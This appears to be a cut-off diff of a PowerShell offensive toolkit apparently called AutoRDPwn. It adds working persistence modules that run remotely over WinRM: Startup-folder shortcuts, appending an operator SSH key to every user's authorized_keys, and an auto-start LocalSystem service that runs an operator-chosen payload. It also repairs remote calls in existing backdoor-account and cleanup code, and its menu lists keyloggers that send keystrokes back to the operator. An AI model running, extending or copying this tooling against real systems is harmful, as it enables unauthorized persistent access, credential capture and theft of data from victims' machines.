@@ -734,6 +734,11 @@ function Get-ARActionCatalog {
     $items.Add((New-ARAction -Id '503' -Title 'Remote Keylogger' -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))
     $items.Add((New-ARAction -Id '904' -Title (Get-ARText 'txt174' 'Fast keylogger') -Description 'Log keystrokes and mirror the buffer back to the operator every 15 seconds' -Handler 'Invoke-ARModuleKeyloggerFast' -NeedsSession $true))
     $items.Add((New-ARAction -Id '504' -Title (Get-ARText 'txt175' 'Persistence kit') -Description 'Install a Run key, a scheduled task and a WMI subscription in one pass' -Handler 'Invoke-ARModulePersistenceKit' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '520' -Title (Get-ARText 'txt226' 'Startup shortcut') -Description (Get-ARText 'txt227' 'Drop a .lnk in the Startup folder of the current user and of all users') -Handler 'Invoke-ARModuleStartupShortcut' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '521' -Title (Get-ARText 'txt228' 'SSH authorized_keys') -Description (Get-ARText 'txt229' 'Append the operator public key to authorized_keys in every user profile') -Handler 'Invoke-ARModuleSshAuthorizedKeys' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '522' -Title (Get-ARText 'txt230' 'Service persistence') -Description (Get-ARText 'txt231' 'Register an automatic service that runs the payload at boot') -Handler 'Invoke-ARModuleServicePersistence' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '523' -Title (Get-ARText 'txt232' 'Boot task') -Description (Get-ARText 'txt233' 'Schedule a task that runs the payload as SYSTEM when the system starts') -Handler 'Invoke-ARModuleBootTask' -NeedsSession $true))
+    $items.Add((New-ARAction -Id '524' -Title (Get-ARText 'txt234' 'WMI subscription') -Description (Get-ARText 'txt235' 'Bind a WMI event filter to a command consumer so the payload runs on every event') -Handler 'Invoke-ARModuleWmiSubscription' -NeedsSession $true))
 
     $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation') -Description (Get-ARText 'txt144' 'Enumerate services, patches and paths to SYSTEM')))
     $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
@@ -3501,7 +3506,7 @@ function Remove-ARTargetArtifacts {
     $registryBackup = @($script:ARRegistryBackup.ToArray())
     if ($registryBackup.Count -gt 0) {
         try {
-            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $registryBackup -ScriptBlock {
+            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $registryBackup) -ScriptBlock {
                 param($entries)
                 $failed = New-Object System.Collections.Generic.List[string]
                 foreach ($entry in $entries) {
@@ -3544,7 +3549,7 @@ function Remove-ARTargetArtifacts {
     if ($products.Count -gt 0) {
         try {
             Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 10 -Status ('Removing ' + $products.Count + ' product(s)')
-            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $products -ScriptBlock {
+            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $products) -ScriptBlock {
                 param($productCodes)
                 $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
                 $failed = New-Object System.Collections.Generic.List[string]
@@ -3582,7 +3587,7 @@ function Remove-ARTargetArtifacts {
     if ($firewallRestore.Count -gt 0) {
         try {
             $ruleNames = @($firewallRestore | ForEach-Object { [string]$_.Name } | Where-Object { $_ -ne '' })
-            Invoke-ARRemote -Session $Session -ArgumentList $ruleNames -ScriptBlock {
+            Invoke-ARRemote -Session $Session -ArgumentList (, $ruleNames) -ScriptBlock {
                 param($names)
                 foreach ($name in $names) {
                     Set-NetFirewallRule -Name $name -Enabled False -ErrorAction SilentlyContinue
@@ -3601,7 +3606,7 @@ function Remove-ARTargetArtifacts {
     $defenderChanges = @($script:ARRemoteDefenderChanges.ToArray())
     if ($defenderChanges.Count -gt 0) {
         try {
-            Invoke-ARRemote -Session $Session -ArgumentList $defenderChanges -ScriptBlock {
+            Invoke-ARRemote -Session $Session -ArgumentList (, $defenderChanges) -ScriptBlock {
                 param($changes)
                 foreach ($change in $changes) {
                     $kind = [string]$change.Kind
@@ -4487,7 +4492,7 @@ function Remove-ARModuleArtifacts {
             foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
         }
         elseif ($script:ARSession) {
-            Invoke-Command -Session $script:ARSession -ArgumentList $paths -ScriptBlock {
+            Invoke-Command -Session $script:ARSession -ArgumentList (, $paths) -ScriptBlock {
                 param($items)
                 foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
             } -ErrorAction Stop | Out-Null
@@ -7597,7 +7602,7 @@ function Invoke-ARModuleAlwaysInstallElevated {
         'SOFTWARE\Policies\Microsoft\Windows\Installer',
         'SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\Installer'
     )
-    $result = Invoke-ARRemote -Session $session -ArgumentList $relativePaths -ScriptBlock {
+    $result = Invoke-ARRemote -Session $session -ArgumentList (, $relativePaths) -ScriptBlock {
         param($paths)
         $rows = New-Object System.Collections.Generic.List[object]
         $hives = @(
@@ -8345,7 +8350,7 @@ function Invoke-ARModuleSystemTask {
                 if (([string]$name).StartsWith('AutoRDPwnSys')) { $ledger.Add([string]$name) }
             }
         }
-        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
             param($names)
             $deleted = New-Object System.Collections.Generic.List[string]
             foreach ($name in @($names)) {
@@ -8460,7 +8465,7 @@ function Invoke-ARModuleSystemService {
     if ($operation -match '^2') {
         $ledger = New-Object System.Collections.Generic.List[string]
         foreach ($name in @($script:ARCreatedServices.ToArray())) { $ledger.Add([string]$name) }
-        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
             param($names)
             $deleted = New-Object System.Collections.Generic.List[string]
             $all = New-Object System.Collections.Generic.List[string]
@@ -8632,7 +8637,7 @@ function Invoke-ARModuleBackdoorAccount {
                 if ([string]$name -ne 'AutoRDPwn' -and -not [string]::IsNullOrWhiteSpace([string]$name)) { $ledger.Add([string]$name) }
             }
         }
-        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
             param($names)
             $deleted = New-Object System.Collections.Generic.List[string]
             $hide = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
@@ -8801,6 +8806,758 @@ function Invoke-ARModuleBackdoorAccount {
     Write-ARInfo ('Cleanup: ' + $accountName + ' is in the account ledger, so session cleanup deletes it with net user /delete.')
     Write-ARInfo 'The password also travelled in the net.exe command line on the target, so it is visible there while the call runs.'
     Set-ARStatus 'Backdoor account created' 'Ok'
+}
+
+function Split-ARModuleExecutable {
+    param([string]$Command)
+    if ([string]::IsNullOrWhiteSpace($Command)) { throw 'The payload command is empty.' }
+    if ($Command -match "[\r\n]") { throw 'The payload command must be a single line.' }
+    $executable = $Command
+    $argumentText = ''
+    if ($Command.StartsWith('"')) {
+        $closing = $Command.IndexOf('"', 1)
+        if ($closing -lt 2) { throw 'The payload command opens a quote that is never closed.' }
+        $executable = $Command.Substring(1, $closing - 1)
+        $argumentText = $Command.Substring($closing + 1).Trim()
+    }
+    else {
+        $space = $Command.IndexOf(' ')
+        if ($space -gt 0) {
+            $executable = $Command.Substring(0, $space)
+            $argumentText = $Command.Substring($space + 1).Trim()
+        }
+    }
+    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The payload command has no executable.' }
+    return [pscustomobject]@{ Executable = $executable; Arguments = $argumentText }
+}
+
+function Invoke-ARModuleStartupShortcut {
+    param([switch]$Remove)
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Startup folder shortcut'
+    $session = Get-ARTargetSession
+    if ($Remove) {
+        $removal = Invoke-ARRemote -Session $session -ScriptBlock {
+            $cap = 50
+            $gone = New-Object System.Collections.Generic.List[string]
+            $failures = New-Object System.Collections.Generic.List[string]
+            $folders = New-Object System.Collections.Generic.List[string]
+            $current = [Environment]::GetFolderPath('Startup')
+            if (-not [string]::IsNullOrWhiteSpace($current)) { $folders.Add($current) }
+            if (-not [string]::IsNullOrWhiteSpace($env:ProgramData)) {
+                $common = Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Startup'
+                if (-not $folders.Contains($common)) { $folders.Add($common) }
+            }
+            foreach ($folder in @($folders.ToArray())) {
+                if (-not (Test-Path -LiteralPath $folder)) { continue }
+                foreach ($file in @(Get-ChildItem -LiteralPath $folder -Filter 'AutoRDPwn*.lnk' -File -ErrorAction SilentlyContinue | Select-Object -First $cap)) {
+                    try {
+                        Remove-Item -LiteralPath $file.FullName -Force -ErrorAction Stop
+                        if (Test-Path -LiteralPath $file.FullName) { $failures.Add([string]$file.FullName + ': still present after the delete') }
+                        else { $gone.Add([string]$file.FullName) }
+                    }
+                    catch { $failures.Add([string]$file.FullName + ': ' + $_.Exception.Message) }
+                }
+            }
+            return [pscustomobject]@{ Deleted = @($gone.ToArray()); Failed = @($failures.ToArray()) }
+        }
+        $removedPaths = @($removal.Deleted)
+        foreach ($path in $removedPaths) {
+            [void]$script:ARTemporaryFiles.Remove([string]$path)
+            [void]$script:ARModuleFiles.Remove([string]$path)
+            Write-ARSuccess ('Removed startup shortcut: ' + [string]$path)
+        }
+        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Shortcut removal failed: ' + [string]$item) }
+        if ($removedPaths.Count -eq 0) { Write-ARInfo 'No AutoRDPwn shortcut is registered in the Startup folders.' }
+        Set-ARStatus 'Startup shortcut removal finished' 'Ok'
+        return [pscustomobject]@{
+            Id      = '520'
+            Action  = 'StartupShortcut'
+            Mode    = 'remove'
+            Target  = $target
+            Removed = $removedPaths
+            Failed  = @($removal.Failed)
+        }
+    }
+    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn startup payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
+    $command = $defaultCommand
+    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the startup shortcut must launch' $defaultCommand }
+    $split = Split-ARModuleExecutable -Command ([string]$command)
+    $shortcutName = 'AutoRDPwn' + (New-ARModuleToken -Length 6) + '.lnk'
+    $result = Invoke-ARRemote -Session $session -ArgumentList $shortcutName, $split.Executable, $split.Arguments -ScriptBlock {
+        param($name, $execute, $argumentText)
+        $created = New-Object System.Collections.Generic.List[object]
+        $errors = New-Object System.Collections.Generic.List[string]
+        $folders = New-Object System.Collections.Generic.List[object]
+        $current = [Environment]::GetFolderPath('Startup')
+        if (-not [string]::IsNullOrWhiteSpace($current)) { $folders.Add([pscustomobject]@{ Path = $current; Scope = 'current user' }) }
+        if (-not [string]::IsNullOrWhiteSpace($env:ProgramData)) {
+            $common = Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Startup'
+            $known = $false
+            foreach ($entry in @($folders.ToArray())) { if ([string]$entry.Path -eq $common) { $known = $true } }
+            if (-not $known) { $folders.Add([pscustomobject]@{ Path = $common; Scope = 'all users' }) }
+        }
+        $shell = New-Object -ComObject WScript.Shell
+        try {
+            foreach ($entry in @($folders.ToArray())) {
+                $folder = [string]$entry.Path
+                if (-not (Test-Path -LiteralPath $folder)) { $errors.Add($folder + ': folder not found'); continue }
+                $path = Join-Path $folder $name
+                try {
+                    $shortcut = $shell.CreateShortcut($path)
+                    $shortcut.TargetPath = $execute
+                    $shortcut.Arguments = $argumentText
+                    $shortcut.WorkingDirectory = Split-Path -Parent $execute
+                    $shortcut.WindowStyle = 7
+                    $shortcut.Description = 'AutoRDPwn'
+                    $shortcut.Save()
+                    if (-not (Test-Path -LiteralPath $path)) { throw 'the .lnk file was not written' }
+                    $check = $shell.CreateShortcut($path)
+                    $created.Add([pscustomobject]@{
+                        Path      = $path
+                        Scope     = [string]$entry.Scope
+                        Target    = [string]$check.TargetPath
+                        Arguments = [string]$check.Arguments
+                    })
+                }
+                catch { $errors.Add($path + ': ' + $_.Exception.Message) }
+            }
+        }
+        finally {
+            try { [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) } catch { }
+        }
+        return [pscustomobject]@{ Created = @($created.ToArray()); Errors = @($errors.ToArray()) }
+    }
+    $createdItems = @($result.Created)
+    foreach ($item in @($result.Errors)) { Write-ARWarn ('Shortcut not created: ' + [string]$item) }
+    if ($createdItems.Count -eq 0) { throw ('No startup shortcut could be created: ' + (@($result.Errors) -join '; ')) }
+    foreach ($item in $createdItems) {
+        $path = [string]$item.Path
+        # ARTemporaryFiles is the report the interface reads; ARModuleFiles is the
+        # collection Remove-ARModuleArtifacts deletes on the target before teardown.
+        if (-not $script:ARTemporaryFiles.Contains($path)) { $script:ARTemporaryFiles.Add($path) }
+        if (-not $script:ARModuleFiles.Contains($path)) { $script:ARModuleFiles.Add($path) }
+        if ($command.Contains($proofLog) -and -not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
+    }
+    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+    $lootDirectory = Get-ARLootDirectory 'persistence'
+    $evidence = New-Object System.Collections.Generic.List[string]
+    $index = 0
+    foreach ($item in @($createdItems | Select-Object -First 8)) {
+        $index++
+        $localPath = Join-Path $lootDirectory ($safeTarget + '-startup-' + $stamp + '-' + $index + '.lnk')
+        try {
+            Receive-ARFileFromTarget -RemotePath ([string]$item.Path) -LocalPath $localPath -Session $session | Out-Null
+            $evidence.Add($localPath)
+        }
+        catch { Write-ARWarn ('Shortcut copy could not be pulled: ' + $_.Exception.Message) }
+    }
+    Write-ARSuccess ('Startup shortcut created: ' + $shortcutName)
+    foreach ($item in $createdItems) { Write-ARInfo ('  ' + [string]$item.Scope + ': ' + [string]$item.Path) }
+    Write-ARInfo ('  target: ' + [string]$split.Executable + ' ' + [string]$split.Arguments)
+    if ($evidence.Count -gt 0) { Write-ARInfo ('  copies pulled to: ' + $evidence[0]) }
+    if ($command.Contains($proofLog)) { Write-ARInfo ('  the payload appends its proof to ' + $proofLog + ' at the next logon of that profile.') }
+    Set-ARStatus 'Startup shortcut installed' 'Ok'
+    return [pscustomobject]@{
+        Id       = '520'
+        Action   = 'StartupShortcut'
+        Mode     = 'install'
+        Target   = $target
+        Shortcut = $shortcutName
+        Command  = [string]$command
+        Created  = @($createdItems | ForEach-Object { [string]$_.Path })
+        Loot     = @($evidence.ToArray())
+        Removed  = $false
+    }
+}
+
+function Invoke-ARModuleSshAuthorizedKeys {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SSH authorized_keys'
+    $session = Get-ARTargetSession
+    $defaultKey = ''
+    if (-not [string]::IsNullOrWhiteSpace($env:USERPROFILE)) {
+        $keyFolder = Join-Path $env:USERPROFILE '.ssh'
+        foreach ($candidate in @(Get-ChildItem -LiteralPath $keyFolder -Filter '*.pub' -File -ErrorAction SilentlyContinue | Select-Object -First 10)) {
+            try {
+                $line = ([System.IO.File]::ReadAllText($candidate.FullName) -split "`r?`n")[0].Trim()
+                if ($line -match '^(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh.com|sk-ecdsa-sha2-nistp256@openssh.com)\s+[A-Za-z0-9+/=]+') {
+                    $defaultKey = $line
+                    break
+                }
+            }
+            catch { }
+        }
+    }
+    $publicKey = $defaultKey
+    if (-not $script:ARInvokedFromOption) { $publicKey = Read-ARValue 'Public key to append (ssh-rsa or ssh-ed25519)' $defaultKey }
+    $publicKey = ([string]$publicKey).Trim()
+    if ($publicKey.Length -eq 0 -or $publicKey.Length -gt 8192) { throw 'The public key must be one OpenSSH line of at most 8192 characters.' }
+    if ($publicKey -match "[\r\n]") { throw 'The public key must be a single line; the comment field cannot carry a line break.' }
+    if ($publicKey -notmatch '^(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh.com|sk-ecdsa-sha2-nistp256@openssh.com)\s+[A-Za-z0-9+/=]+') {
+        throw 'The public key is not OpenSSH format: expected "<type> <base64> [comment]".'
+    }
+    $keyParts = @($publicKey -split '\s+')
+    $profiles = Invoke-ARRemote -Session $session -ScriptBlock {
+        $cap = 100
+        $found = New-Object System.Collections.Generic.List[object]
+        $root = Join-Path $env:SystemDrive 'Users'
+        if (-not (Test-Path -LiteralPath $root)) { return @() }
+        foreach ($profile in @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))) {
+            if ($found.Count -ge $cap) { break }
+            $ssh = Join-Path $profile.FullName '.ssh'
+            if (-not (Test-Path -LiteralPath $ssh -PathType Container)) { continue }
+            $keys = Join-Path $ssh 'authorized_keys'
+            $found.Add([pscustomobject]@{ Profile = [string]$profile.Name; Path = $keys; Exists = [bool](Test-Path -LiteralPath $keys) })
+        }
+        return $found.ToArray()
+    }
+    $plans = New-Object System.Collections.Generic.List[object]
+    foreach ($profile in @($profiles | Select-Object -First 100)) {
+        $plans.Add([pscustomobject]@{
+            Profile = [string]$profile.Profile
+            Path    = [string]$profile.Path
+            Existed = [bool]$profile.Exists
+            Backup  = ('C:\Windows\Temp\' + (New-ARRemoteTempName '.bak'))
+        })
+    }
+    if ($plans.Count -eq 0) {
+        Write-ARInfo 'No user profile on the target has a .ssh directory, so there is nothing to append to.'
+        Set-ARStatus 'SSH authorized_keys: no profile found' 'Ok'
+        return [pscustomobject]@{
+            Id       = '521'
+            Action   = 'SshAuthorizedKeys'
+            Target   = $target
+            Key      = $keyParts[0]
+            Profiles = @()
+            Appended = 0
+            Restored = $false
+            Loot     = @()
+        }
+    }
+    $applied = @()
+    try {
+        $request = [pscustomobject]@{ Plans = @($plans.ToArray()); Key = $publicKey }
+        $applied = @(Invoke-ARRemote -Session $session -ArgumentList $request -ScriptBlock {
+            param($request)
+            $results = New-Object System.Collections.Generic.List[object]
+            foreach ($plan in @($request.Plans)) {
+                $entry = [pscustomobject]@{
+                    Profile        = [string]$plan.Profile
+                    Path           = [string]$plan.Path
+                    Backup         = [string]$plan.Backup
+                    Existed        = [bool]$plan.Existed
+                    Appended       = $false
+                    AlreadyPresent = $false
+                    Error          = ''
+                }
+                try {
+                    $path = [string]$plan.Path
+                    $backup = [string]$plan.Backup
+                    if ([bool]$plan.Existed) { Copy-Item -LiteralPath $path -Destination $backup -Force -ErrorAction Stop }
+                    $current = ''
+                    if ([bool]$plan.Existed) { $current = [System.IO.File]::ReadAllText($path) }
+                    if ($current.Contains([string]$request.Key)) { $entry.AlreadyPresent = $true }
+                    else {
+                        $prefix = ''
+                        if ($current.Length -gt 0 -and -not $current.EndsWith("`n")) { $prefix = "`r`n" }
+                        [System.IO.File]::AppendAllText($path, ($prefix + [string]$request.Key + "`r`n"), (New-Object System.Text.UTF8Encoding($false)))
+                        $after = [System.IO.File]::ReadAllText($path)
+                        if (-not $after.Contains([string]$request.Key)) { throw 'the key is not in the file after the append' }
+                        $entry.Appended = $true
+                    }
+                }
+                catch { $entry.Error = $_.Exception.Message }
+                $results.Add($entry)
+            }
+            return $results.ToArray()
+        })
+        $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
+        $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+        $evidence = New-Object System.Collections.Generic.List[string]
+        $index = 0
+        foreach ($entry in @($applied)) {
+            if ([string]$entry.Error -ne '') { Write-ARWarn ('authorized_keys not written for ' + [string]$entry.Profile + ': ' + [string]$entry.Error) }
+            elseif ([bool]$entry.AlreadyPresent) { Write-ARInfo ('Key already present for ' + [string]$entry.Profile + ': ' + [string]$entry.Path) }
+            else { Write-ARSuccess ('Key appended for ' + [string]$entry.Profile + ': ' + [string]$entry.Path) }
+            if ([string]$entry.Error -ne '' -or $index -ge 10) { continue }
+            $index++
+            $localPath = Join-Path (Get-ARLootDirectory 'ssh') ($safeTarget + '-authorized_keys-' + $stamp + '-' + $index + '.txt')
+            try {
+                Receive-ARFileFromTarget -RemotePath ([string]$entry.Path) -LocalPath $localPath -Session $session | Out-Null
+                $evidence.Add($localPath)
+            }
+            catch { Write-ARWarn ('authorized_keys copy could not be pulled: ' + $_.Exception.Message) }
+        }
+    }
+    finally {
+        $restoreResult = $null
+        try {
+            $restoreResult = Invoke-ARRemote -Session $session -ArgumentList (, @($plans.ToArray())) -ScriptBlock {
+                param($items)
+                $restored = New-Object System.Collections.Generic.List[string]
+                $failed = New-Object System.Collections.Generic.List[string]
+                foreach ($plan in @($items)) {
+                    try {
+                        $path = [string]$plan.Path
+                        $backup = [string]$plan.Backup
+                        $existed = [bool]$plan.Existed
+                        if ($existed) {
+                            if (-not (Test-Path -LiteralPath $backup)) { throw 'the backup file is missing' }
+                            Copy-Item -LiteralPath $backup -Destination $path -Force -ErrorAction Stop
+                        }
+                        elseif (Test-Path -LiteralPath $path) { Remove-Item -LiteralPath $path -Force -ErrorAction Stop }
+                        if (Test-Path -LiteralPath $backup) { Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue }
+                        $restored.Add($path)
+                    }
+                    catch { $failed.Add([string]$plan.Path + ': ' + $_.Exception.Message) }
+                }
+                return [pscustomobject]@{ Restored = @($restored.ToArray()); Failed = @($failed.ToArray()) }
+            }
+        }
+        catch { Write-ARWarn ('authorized_keys restore incomplete: ' + $_.Exception.Message) }
+        if ($null -ne $restoreResult) {
+            foreach ($item in @($restoreResult.Restored)) { Write-ARInfo ('Original file restored: ' + [string]$item) }
+            foreach ($item in @($restoreResult.Failed)) { Write-ARWarn ('Restore failed: ' + [string]$item) }
+        }
+    }
+    $added = @($applied | Where-Object { [bool]$_.Appended }).Count
+    $alreadyThere = @($applied | Where-Object { [bool]$_.AlreadyPresent }).Count
+    $failed = @($applied | Where-Object { [string]$_.Error -ne '' }).Count
+    $keyLabel = $keyParts[0]
+    if ($keyParts.Count -gt 1) { $keyLabel = $keyLabel + ' ' + $keyParts[1].Substring(0, [Math]::Min(24, $keyParts[1].Length)) + '...' }
+    Write-ARInfo ('Profiles with .ssh: ' + $plans.Count + '; keys appended: ' + $added + '; already present: ' + $alreadyThere + '; failed: ' + $failed + '.')
+    Write-ARInfo 'The original files were restored in the finally block: nothing stays appended after this action.'
+    Set-ARStatus 'SSH authorized_keys proof finished' 'Ok'
+    return [pscustomobject]@{
+        Id       = '521'
+        Action   = 'SshAuthorizedKeys'
+        Target   = $target
+        Key      = $keyLabel
+        Profiles = @($plans | ForEach-Object { [string]$_.Path })
+        Appended = [int]$added
+        Failed   = [int]$failed
+        Restored = $true
+        Loot     = @($evidence.ToArray())
+    }
+}
+
+function Invoke-ARModuleServicePersistence {
+    param([switch]$Remove)
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Auto-start service persistence'
+    $session = Get-ARTargetSession
+    if ($Remove) {
+        $ledger = New-Object System.Collections.Generic.List[string]
+        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) {
+            foreach ($name in @($script:ARCreatedServices.ToArray())) {
+                if (([string]$name).StartsWith('AutoRDPwnAuto')) { $ledger.Add([string]$name) }
+            }
+        }
+        $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
+            param($names)
+            $deleted = New-Object System.Collections.Generic.List[string]
+            $failed = New-Object System.Collections.Generic.List[string]
+            $all = New-Object System.Collections.Generic.List[string]
+            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
+            foreach ($service in @(Get-Service -Name 'AutoRDPwnAuto*' -ErrorAction SilentlyContinue)) {
+                if (-not $all.Contains([string]$service.Name)) { $all.Add([string]$service.Name) }
+            }
+            foreach ($name in @($all.ToArray())) {
+                $existed = ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue))
+                & sc.exe stop $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    $current = Get-Service -Name $name -ErrorAction SilentlyContinue
+                    if ($null -eq $current) { break }
+                    if ([string]$current.Status -eq 'Stopped') { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
+                    if ($existed) { $deleted.Add($name) }
+                }
+                else { $failed.Add($name + ': still registered after sc.exe delete') }
+            }
+            return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($failed.ToArray()) }
+        }
+        $removedNames = @($removal.Deleted)
+        foreach ($name in $removedNames) {
+            if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedServices.Remove([string]$name) }
+            Write-ARSuccess ('Removed service: ' + [string]$name)
+        }
+        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Service removal failed: ' + [string]$item) }
+        if ($removedNames.Count -eq 0) { Write-ARInfo 'No AutoRDPwn auto-start service is registered on the target.' }
+        Set-ARStatus 'Auto-start service removal finished' 'Ok'
+        return [pscustomobject]@{
+            Id      = '522'
+            Action  = 'ServicePersistence'
+            Mode    = 'remove'
+            Target  = $target
+            Removed = $removedNames
+            Failed  = @($removal.Failed)
+        }
+    }
+    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn service payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
+    $command = $defaultCommand
+    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the auto-start service must run' $defaultCommand }
+    $split = Split-ARModuleExecutable -Command ([string]$command)
+    $serviceName = 'AutoRDPwnAuto' + (New-ARModuleToken -Length 6)
+    $binPath = '"' + $split.Executable + '"'
+    if (-not [string]::IsNullOrWhiteSpace($split.Arguments)) { $binPath = $binPath + ' ' + $split.Arguments }
+    $proof = ''
+    try {
+        $result = Invoke-ARRemote -Session $session -ArgumentList $serviceName, $binPath -ScriptBlock {
+            param($name, $path)
+            if ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
+                & sc.exe stop $name 2>&1 | Out-Null
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+            }
+            New-Service -Name $name -BinaryPathName $path -DisplayName 'AutoRDPwn helper' -StartupType Automatic -ErrorAction Stop | Out-Null
+            $config = [string](& sc.exe qc $name 2>&1 | Out-String)
+            $startOutput = [string](& sc.exe start $name 2>&1 | Out-String)
+            $startCode = $LASTEXITCODE
+            Start-Sleep -Seconds 2
+            $startTypeCode = -1
+            $match = [regex]::Match($config, '(?m)START_TYPE\s*:\s*(\d+)')
+            if ($match.Success) { $startTypeCode = [int]$match.Groups[1].Value }
+            $service = Get-Service -Name $name -ErrorAction SilentlyContinue
+            $state = 'missing'
+            if ($null -ne $service) { $state = [string]$service.Status }
+            return [pscustomobject]@{
+                Name          = $name
+                BinPath       = $path
+                StartCode     = [int]$startCode
+                StartOutput   = $startOutput.Trim()
+                State         = $state
+                StartTypeCode = [int]$startTypeCode
+            }
+        }
+        # Registered before the verification: a failure after the create still
+        # names the service, and the finally below is what removes it.
+        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) {
+            if (-not $script:ARCreatedServices.Contains($serviceName)) { $script:ARCreatedServices.Add($serviceName) }
+        }
+        if ([int]$result.StartTypeCode -ne 2) { throw ('The service was created but sc qc reports start type ' + [string]$result.StartTypeCode + ' instead of AUTO_START (2).') }
+        Write-ARSuccess ('Service created: ' + $serviceName + ' (LocalSystem, start= auto)')
+        Write-ARInfo ('  binPath = ' + [string]$result.BinPath)
+        if ([int]$result.StartCode -ne 0) {
+            Write-ARInfo ('  sc start exit ' + [string]$result.StartCode + ': ' + [string]$result.StartOutput)
+            Write-ARInfo '  A 1053 here means the command ran and exited before reporting back, which is normal for a one-shot payload.'
+        }
+        else { Write-ARInfo ('  service state now: ' + [string]$result.State) }
+        if ($command.Contains($proofLog)) {
+            if (-not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
+            for ($attempt = 0; $attempt -lt 20; $attempt++) {
+                Start-Sleep -Seconds 1
+                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
+                    param($path)
+                    if (-not (Test-Path -LiteralPath $path)) { return '' }
+                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
+                })
+                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+            }
+            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof line appeared: the service started but the command wrote nothing.' }
